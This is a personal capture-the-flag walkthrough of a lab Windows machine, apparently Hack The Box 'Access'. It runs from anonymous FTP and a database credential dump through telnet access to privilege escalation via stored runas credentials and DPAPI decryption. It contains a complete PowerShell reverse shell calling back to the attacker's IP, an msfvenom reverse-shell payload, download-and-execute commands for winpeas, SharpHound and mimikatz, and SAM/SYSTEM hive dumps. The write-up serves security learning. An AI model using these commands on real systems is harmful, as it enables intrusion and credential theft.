Quick enum:

```
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 127
23/tcp open  telnet  syn-ack ttl 127
80/tcp open  http    syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 27.65 seconds

```

Let's try ftp anonymous login:
```
ftp $(cat ip) 21
Connected to 10.10.10.98.
220 Microsoft FTP Service
Name (10.10.10.98:lotape6): anonymous # Default anonymous login
Password:     
# Just hit enter
```
And we are in! 
Over the Backups folder we find some `.mdb` file which looks quite interesting. Let's dig a bit on the extension. It looks like it is related to a Microsoft DataBase, so let's download it in our pc and try to find sensitive data:

```
ftp> get backup.mdb
```

We also find some linux interesting packages to treat those files: `mdbtools` 
[MDBTools Utilities](https://mdbtools.sourceforge.net/install/x53.htm)
```
mdb-ver -> JET4
```
We have some error trying to list the tables and looks like a library error, so lets download the development version:
```
install mdbtools-dev
```
Also didn't work so let's download it form the [repo](https://github.com/cyberemissary/mdbtools) 
Newly it fails. After some googling about the errors and potential solutions, I've seen some people that suggest to try other methods to download the file.
I've tried downloading it again, and I managed to observe some discrepancy in the file size of 814 bytes. It looks to be related to the line break characters being transformed. 

Let's now try to retrieve the file using wget and curl:
```
wget ftp://anonymous:@$(cat ip)/Backups/backup.mdb
# Fails
curl -u anonymous: ftp://$(cat ip)/Backups/backup.mdb -o backup.mdb
# Gets stuck
```

I've seen that there is an specific option `binary` to set the ftp in binary mode, so let's try it.
And it does work now! Let's dump the content of the database then!
```
mdb-tables backup.mdb
acc_antiback acc_door acc_firstopen acc_firstopen_emp acc_holidays acc_interlock acc_levelset acc_levelset_door_group acc_linkageio acc_map acc_mapdoorpos acc_morecardempgroup acc_morecardgroup acc_timeseg acc_wiegandfmt ACGroup acholiday ACTimeZones action_log AlarmLog areaadmin att_attreport att_waitforprocessdata attcalclog attexception AuditedExc auth_group_permissions auth_message auth_permission auth_user auth_user_groups auth_user_user_permissions base_additiondata base_appoption base_basecode base_datatranslation base_operatortemplate base_personaloption base_strresource base_strtranslation base_systemoption CHECKEXACT CHECKINOUT dbbackuplog DEPARTMENTS deptadmin DeptUsedSchs devcmds devcmds_bak django_content_type django_session EmOpLog empitemdefine EXCNOTES FaceTemp iclock_dstime iclock_oplog iclock_testdata iclock_testdata_admin_area iclock_testdata_admin_dept LeaveClass LeaveClass1 Machines NUM_RUN NUM_RUN_DEIL operatecmds personnel_area personnel_cardtype personnel_empchange personnel_leavelog ReportItem SchClass SECURITYDETAILS ServerLog SHIFT TBKEY TBSMSALLOT TBSMSINFO TEMPLATE USER_OF_RUN USER_SPEDAY UserACMachines UserACPrivilege USERINFO userinfo_attarea UsersMachines UserUpdates worktable_groupmsg worktable_instantmsg worktable_msgtype worktable_usrmsg ZKAttendanceMonthStatistics acc_levelset_emp acc_morecardset ACUnlockComb AttParam auth_group AUTHDEVICE base_option dbapp_viewmodel FingerVein devlog HOLIDAYS personnel_issuecard SystemLog USER_TEMP_SCH UserUsedSClasses acc_monitor_log OfflinePermitGroups OfflinePermitUsers OfflinePermitDoors LossCard TmpPermitGroups TmpPermitUsers TmpPermitDoors ParamSet acc_reader acc_auxiliary STD_WiegandFmt CustomReport ReportField BioTemplate FaceTempEx FingerVeinEx TEMPLATEEx

# Let's dump all tables
mdb-tables backup.mdb | tr ' ' '\n' | grep -i user | xargs -I % sh -c "mdb-export backup.mdb % > %_db"

# After inspeciton
cat auth_user_db
id,username,password,Status,last_login,RoleID,Remark
25,"admin","admin",1,"08/23/18 21:11:47",26,
27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
28,"backup_admin","admin",1,"08/23/18 21:14:02",26,
```

After also downloading the content over `engineer` ftp server, we find out a password protected zip. After trying engineer pass, we can extract successfully its content.
We find in there a `.pst` file. After a bit of googling, we find the following package `pst-utils` so let's give it a try [(docs)](https://www.five-ten-sg.com/libpst/):
```
lspst AccessControl.pst
Email   From: john@megacorp.com Subject: MegaCorp Access Control System "security" account
```
After some further googling I've found this: https://www.reddit.com/r/linux/comments/4syuw5/working_with_a_pst_file_in_linux/. It recommends using `evolution` program to import and navigate through the pst file. After installing it via apt and importing the file we find out this:
```
Hi there,

The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.

Regards,

John
```

After finding so, we can now try to log int over telnet with the obtained credentials:
```
user: security
pass: 4Cc3ssC0ntr0ller

telnet $(cat ip)
```

And we are in! 
user.txt
```
0469ed...
```

Since we have a very ugly shell, let's try to gain a revrse shell to be more confortable
https://github.com/rtaylor777/ps_cmd_rev_shell
```
set HOSTIP=10.10.16.6
set EXP1=31415  
powershell.exe -Exec Bypass "& {$storageDir = $pwd;$webclient = New-Object System.Net.WebClient;$url = 'http://%HOSTIP%/psrev.vbs';$file = 'psrev.vbs';$webclient.DownloadFile($url,$file)}"
```
Forget about it, https://www.revshells.com/ PowerShell #2 did the trick

```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.16.6',31415);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Once we are with our "a bit better" reverse shell, let's try to download winpeas.exe with the following #windows-http-file-download method:
```
$client = new-object System.Net.WebClient
$client.DownloadFile("http://10.10.16.6/peas.exe","C:\Users\security\Desktop\peas.exe")
```

Cannot run peas.exe, so let's try to run SharpHound on the machine.
```
$client = new-object System.Net.WebClient
$client.DownloadFile("http://10.10.16.6/sh.ps1","C:\Users\security\Desktop\sh.ps1")

./sh.ps1 -c All -d htb.local --zipfilename loot.zip

```

Nothing is running from the security user, so let's try to create a new account to try to access a wrong SMB path and try to capture the NTLM hashes with a NTLM Relay Attack #ntlm-relay-attack .

Definitely it looks like I cannot run anything from telnet, nor the revrse shell obtained, so it's time to take a look to the last open port, 80.

After some gobust search I've only found one interesting endpoint:
```
gobuster dir --url http://accesscontrolsystems.htb/ --wordlist /home/lotape6/resources/hack/SecLists/Discovery/Web-Content/common.txt
===============================================================
/aspnet_client        (Status: 301) [Size: 169] [--> http://accesscontrolsystems.htb/aspnet_client/]
/index.html           (Status: 200) [Size: 391]
```
After some further search in google about the `aspnet_client` thingy, I've found that it may be interesting to fuzz that webpage, so let's get to it:
https://hcibo.medium.com/my-pentest-log-1-1bd47e9998bd
https://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html
It worth to deploy the #ntlm-relay-attack once again just in case with the fuzzing we have any interesting. We didn't, although at some point I managed to receive some connection in the NTLM Relay x from impacket, but it was not successful. 

I've been digging a little bit into the filesystem trying to find the web page folder to check if there is anything intersting. It looks like default folder is `wwwroot`, and I found it on `C:\inetpub`

I'll try to upload any file that could lead me to rce and I may pivot to a more interesting user.
```
$asdnt = new-object System.Net.WebClient

$asdnt.DownloadFile("http://10.10.16.6:81/test.php","C:\inetpub\wwwroot\test.php")
```

In the end, I missed going to Public's Desktop and checkout that there is a strange .lnk file in there. (insert facepalm here)

We can check where is it pointing thanks to :

```
$sh = New-Object -ComObject WScript.Shell
$target = $sh.CreateShortcut("C:\Users\Public\Desktop\ZKAccess3.5 Security System.lnk").TargetPath

echo $target

C:\Windows\System32\runas.exe
```

After searching for "stored credentials runas" we find interesting info:
https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/StoredCredentialsRunas.md

```
cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
    Type: Domain Password
    User: ACCESS\Administrator

```
The next step is to create a malicious executable to obtain a reverse shell through the runas command.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.6 LPORT=1415 -f exe -o nikos.exe

$down = new-object System.Net.WebClient
$down.DownloadFile("http://10.10.16.6:81/nikos.exe","C:\Users\security\Desktop\nikos.exe")

```

 Start listening on the port

```
runas /savecred /user:ACCESS\Administrator "C:\Users\security\Desktop\nikos.exe"
```

And BOOOOOOOOM! We are in
root.txt
```
b1b70....
```


```
reg save hklm\sam C:\inetpub\ftproot\sam
reg save hklm\system C:\inetpub\ftproot\system

```

Then we connect though ftp and set the `binary` option, and after trying to attack the hashes with different wordlists, no credential is obtained.

It's time to check the Data Protection API (DPAPI):
```
vaultcmd /list
C:\Windows\system32>vaultcmd /list
vaultcmd /list
Currently loaded vaults:
        Vault: Administrator's Vault
        Vault Guid:{4BF4C442-9B8A-41A0-B380-DD4A704DDB28}
        Location: C:\Users\Administrator\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
        Status: Unlocked
        Visibility: Not hidden

        Vault: Windows Vault
        Vault Guid:{77BC582B-F0A6-4E15-4E80-61736B6F3B29}
        Location: C:\Users\Administrator\AppData\Local\Microsoft\Vault
        Status: Unlocked
        Visibility: Not hidden


VaultCmd /listproperties:"Administrator's Vault"
vaultcmd /listcreds:"Administrator's Vault"

no creds

VaultCmd /listproperties:"Windows Vault"
vaultcmd /listcreds:"Windows Vault"
```

Nothing interesting, so let's try out [mimikatz](https://github.com/ParrotSec/mimikatz):

```
powershell.exe -Exec Bypass "$down = new-object System.Net.WebClient ; $down.DownloadFile('http://10.10.16.6/mimikatz.exe','C:\Windows\system32\mimizatkz.exe')"

powershell.exe -Exec Bypass "$down = new-object System.Net.WebClient ; $down.DownloadFile('http://10.10.16.6/mimidrv.sys','C:\mimidrv.sys')"

powershell.exe -Exec Bypass "$down = new-object System.Net.WebClient ; $down.DownloadFile('http://10.10.16.6/mimilib.dll','C:\mimilib.dll')"


# Then we can run mimikatz (with the wrong name ^^')
cmd /K "C:\mimizatkz.exe"

mimikatz # vault::list

Vault : {4bf4c442-9b8a-41a0-b380-dd4a704ddb28}
        Name       : Administrator's Vault
        Path       : C:\Users\Administrator\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
        Items (0)

Vault : {77bc582b-f0a6-4e15-4e80-61736b6f3b29}
        Name       : Windows Vault
        Path       : C:\Users\Administrator\AppData\Local\Microsoft\Vault
        Items (0)
```

Trying to dump credentials I receive the following error:
```
dpapi::cred /in:C:\Users\Administrator\AppData\Local\Microsoft\Vault
ERROR kuhl_m_dpapi_cred ; kull_m_file_readData (0x00000005)
```
After some search people recommend an specific version of mimikatz:
https://www.reddit.com/r/oscp/comments/10vgzpj/help_with_mimikatz_error_error_kuhl_m_sekurlsa/
https://gitlab.com/kalilinux/packages/mimikatz/-/blob/3100a45278237cb7f87ef28f7edbfef4135c615c/x64/mimikatz.exe

```
mimikatz # lsadump::secrets
Domain : ACCESS
SysKey : 7bcd379ac66c1b59d149aef9a6746dc0
ERROR kuhl_m_lsadump_secretsOrCache ; kull_m_registry_RegOpenKeyEx (SECURITY) (0x00000005)

```
Still not working, so let's take a look to the folder where the vault is stored and let's check if there is any credential file nearby

We found something for the security user:
```
dir /a:h C:\Users\security\AppData\Roaming\Microsoft\Credentials\
dir /a:h C:\Users\security\AppData\Roaming\Microsoft\Credentials\
 Volume in drive C has no label.
 Volume Serial Number is 8164-DB5F

 Directory of C:\Users\security\AppData\Roaming\Microsoft\Credentials

08/22/2018  09:18 PM               538 51AB168BE4BDB3A603DADE4F8CA81290



mimikatz # dpapi::cred /in:C:\Users\security\AppData\Roaming\Microsoft\Credentials\51AB168BE4BDB3A603DADE4F8CA81290
**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {0792c32e-48a5-4fe3-8b43-d93d64590580}
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 0000003a - 58
  szDescription      : Enterprise Credential Data

  algCrypt           : 00006610 - 26128 (CALG_AES_256)
  dwAlgCryptLen      : 00000100 - 256
  dwSaltLen          : 00000020 - 32
  pbSalt             : f5bbbac240bd90d9af7d3c2cfb7f301f1f123ac94d07a3cc012038135fa5a6bc
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         :
  algHash            : 0000800e - 32782 (CALG_SHA_512)
  dwAlgHashLen       : 00000200 - 512
  dwHmac2KeyLen      : 00000020 - 32
  pbHmack2Key        : f9642d323fae366a4f7293d02f26e4472adc32b00bac6a061914458dadfd3e52
  dwDataLen          : 00000100 - 256
  pbData             : e73542ff71d08529f9da5ff88edcd5be44d11c9c02c45fdfd9ee5a531628cb0f9e8dc221eb5b4d83a857aff13473131c927527217fe177e08d63a63eb5ce5341576b33332806e062363e58786fb7551aaa2e0676b8e3957f43cf1f11a2ed149c431104e5f93f20364916df25a0168ede23788bd9d71192cdb661c5c5686ed256c8691057fe6fe2a2b1765ba0979ee9140c010210eea81ac00830f74c35a196ac1f46bd69d7a86ca82da15f9bbcf1c40cbbe41d58d4a8924afde97e2a99a6e9f33a297ef2508401c229a451b911e9469ba17d71288dc6c37ee26c65ecc8accd4b5b3c0c2ccfcae6b0a76384a0e27c4edb7a0ecece2afd9889252304db5767bbc3
  dwSignLen          : 00000040 - 64
  pbSign             : 63fcc153bcd60befd074a5098ea0e552f8809562c553985baa8720a828e61e05bd5d1cb8200711551a100ed3b853598b3875ba90b689bc483342fbf671b89c99

```

After some strugling, let's do it right and check the walktrhough:

1st step is to check the masterkey in the default path #windows-interesting-folders :
```
dir /a C:\Users\security\AppData\Roaming\Microsoft\Protect

S-1-5-21-953262931-566350628-63446256-1001

# inside pref fodlder there's a file found
0792c32e-48a5-4fe3-8b43-d93d64590580
```

MasterKey
```
C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001\0792c32e-48a5-4fe3-8b43-d93d64590580
```

Credential
```
C:\Users\security\AppData\Roaming\Microsoft\Credentials\51AB168BE4BDB3A603DADE4F8CA81290
```


```
 dpapi::masterkey /in:C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001\0792c32e-48a5-4fe3-8b43-d93d64590580 /sid:S-1-5-21-953262931-566350628-63446256-1001 /password:4Cc3ssC0ntr0ller

[masterkey] with password: 4Cc3ssC0ntr0ller (normal user)
  key : b360fa5dfea278892070f4d086d47ccf5ae30f7206af0927c33b13957d44f0149a128391c4344a9b7b9c9e2e5351bfaf94a1a715627f27ec9fafb17f9b4af7d2
  sha1: bf6d0654ef999c3ad5b09692944da3c0d0b68afe

```

Mimikatz is your friend, so you can check the credential stored in the internal cache:
```
dpapi::cache
```

And now it's time to decode the store credential once we have the master key cached:
```
dpapi::cred /in:C:\Users\security\AppData\Roaming\Microsoft\Credentials\51AB168BE4BDB3A603DADE4F8CA81290
```

```
Decrypting Credential:
 * volatile cache: GUID:{0792c32e-48a5-4fe3-8b43-d93d64590580};KeyHash:bf6d0654ef999c3ad5b09692944da3c0d0b68afe
**CREDENTIAL**
  credFlags      : 00000030 - 48
  credSize       : 000000f4 - 244
  credUnk0       : 00002004 - 8196

  Type           : 00000002 - 2 - domain_password
  Flags          : 00000000 - 0
  LastWritten    : 8/22/2018 9:18:49 PM
  unkFlagsOrSize : 00000038 - 56
  Persist        : 00000003 - 3 - enterprise
  AttributeCount : 00000000 - 0
  unk0           : 00000000 - 0
  unk1           : 00000000 - 0
  TargetName     : Domain:interactive=ACCESS\Administrator
  UnkData        : (null)
  Comment        : (null)
  TargetAlias    : (null)
  UserName       : ACCESS\Administrator
  CredentialBlob : 55Acc3ssS3cur1ty@megacorp
  Attributes     : 0


```